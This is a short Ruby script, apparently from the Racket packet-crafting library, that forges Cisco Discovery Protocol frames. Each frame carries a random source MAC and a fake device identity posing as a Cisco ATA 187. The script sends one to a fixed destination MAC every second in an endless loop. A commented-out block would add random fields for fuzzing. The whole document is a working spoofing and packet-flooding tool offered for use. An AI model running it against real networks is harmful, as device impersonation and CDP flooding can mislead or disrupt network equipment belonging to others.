#!/usr/bin/env ruby
#
# $Id: cdp-spew 156 2009-12-14 02:27:22Z jhart $
#
# Spew CDP packets to all Cisco devices on the network
#
# Jon Hart <jhart@spoofed.org>

require 'rubygems'
require 'racket'
include Racket

unless (ARGV.size >= 1)
  puts "Usage: #{$0} <iface> [num fields per CDP packet]"
  exit 
end

def tick 
  @it += 1
  @it = 0 if @it >= @ticks.size
  print "\r#{@ticks[@it]}"
  STDOUT.flush
end

def randcdp
  @n.layers[2] = L2::EightOTwoDotThree.new(Misc.randstring(14))
#  @n.layers[2].dst_mac = "00:1F:CA:E7:94:93"
 # @n.layers[2].dst_mac = "00:1D:70:5F:80:A1"
  @n.layers[2].dst_mac = "EC:44:76:1F:7E:60"
  @n.layers[2].length = 0
  @n.layers[3] = L2::LLC.new()
  @n.layers[3].control = 0x03 
  @n.layers[4] = L2::SNAP.new()
  @n.layers[4].org = 0x00000c
  @n.layers[4].pid = 0x2000
  @n.layers[5] = L3::CDP.new()
  @n.layers[5].version = 2
  @n.layers[5].ttl = 120
  @n.layers[5].add_field(0x0001,'ATB81234329201211212121122')
  @n.layers[5].add_field(0x0002,'c0a8a416')
  @n.layers[5].add_field(0x0003,'Port 1')
  @n.layers[5].add_field(0x0004,'00000090')
  @n.layers[5].add_field(0x0005,'ATA 9-0-2-05-07')
  @n.layers[5].add_field(0x0006,'Cisco ATA 187')
  @n.layers[5].add_field(0x000a,'0001')
  @n.layers[5].add_field(0x000b,'00')
#  @n.layers[5].checksum =  @n.layers[5].checksum! 
=begin
  limit = ARGV[1].to_i || 100
  1.upto(limit) do |f|
    @n.layers[5].add_field(f, Misc.randstring(10))
  end
=end
  @n.sendpacket
  tick
end

@it = 0
@ticks = %w( / - \\ | )

@n = Racket::Racket.new
@n.iface = ARGV[0]

puts "Spewing..."
while (true)
  randcdp
  sleep 1
end
